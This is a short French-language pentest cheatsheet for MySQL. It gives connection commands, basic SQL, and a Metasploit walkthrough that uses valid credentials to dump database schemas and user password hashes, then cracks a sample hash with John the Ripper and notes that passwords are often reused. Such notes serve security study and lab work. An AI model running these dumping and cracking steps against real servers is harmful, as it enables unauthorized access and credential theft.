# MySQL	
***RDBMS*** : Relational DataBase Management System
***SGBD*** :  System de Gestion de Base de Données  

##### Connect to MYSQL remote server
```bash
mysql -u [username] -p -h [host ip]
```
**View a .sql file (depuis mysql) /!\ il fait être dans le dosser du fichier**
```bash
source file.sql
```

## SQL CHEATSHEET :
```sql
SHOW DATABASES;
USE db_name;
SHOW TABLES;
DESCRIBE table_name;
```


## Exemple d'exploit avec metasploit
Pour cet exemple, il nous faut des credentials valides
### Test des credentials
```bash
mysql -h [IP] -u [username] -p
```

### Utilisation de MetaSploit :
(Danc l'exemple ci-dessous, la version de MySQL est vulnérable aux payloads qui suivent)
Lancer MSF :
```bash
msfconsole
```
Exploit :  
```bash
search mysql_sql
use 0
set password/rhosts/username
run
result -> 5.7.29-0ubuntu0.18.04.1
```
renvoie les noms des bases de données


```bash
search mysql_schemadump
use 0
set options
run
```
result -> all databases and columns name and type


```bash
search mysql_hashdump
use 1
set options
run
```
results -> all usernames and passwords hashes

### Crash hashes

```carl:*EA031893AA21444B170FC2162A56978B8CEECE18```
```bash
john hash.txt
```

***Les mots de passe sont très souvent réutilisés***


